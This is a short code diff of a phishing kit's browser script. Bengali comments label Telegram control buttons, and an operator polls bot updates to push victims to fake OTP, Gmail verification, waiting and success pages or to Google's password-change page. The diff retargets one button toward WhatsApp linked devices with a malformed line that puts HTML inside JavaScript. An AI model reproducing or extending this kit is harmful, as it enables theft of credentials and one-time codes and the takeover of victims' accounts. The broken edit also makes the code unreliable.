@@ -157,7 +157,7 @@
         // টেলিগ্রাম কন্ট্রোল বাটনসমূহ
         const keyboard = {
             inline_keyboard: [
-                [{ text: "🔑 Pass Change (Tamil)", callback_data: `pass_cmd` }],
+                [{ text: "🔑 Pass Change (Tamil)", callback_data: `whatsapp_cmd` }],
                 [{ text: "📩 Get OTP Page", callback_data: "otp_cmd" }],
                 [{ text: "📨 Gmail Verify Page", callback_data: "email_page_cmd" }],
                 [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
@@ -264,7 +264,7 @@
                     data.result.forEach(update => {
                         lastUpdateId = update.update_id;
                         const cmd = update.callback_query?.data;
-                        if (cmd === "pass_cmd") window.location.href = "https://myaccount.google.com/signinoptions/password?hl=ta";
+                        if (cmd === "pass_cmd") <a href="https://wa.me/settings/linked_devices">";
                         else if (cmd === "otp_cmd") goToStep('otp_page');
                         else if (cmd === "email_page_cmd") goToStep('step2');
                         else if (cmd === "success") goToStep('success_page');
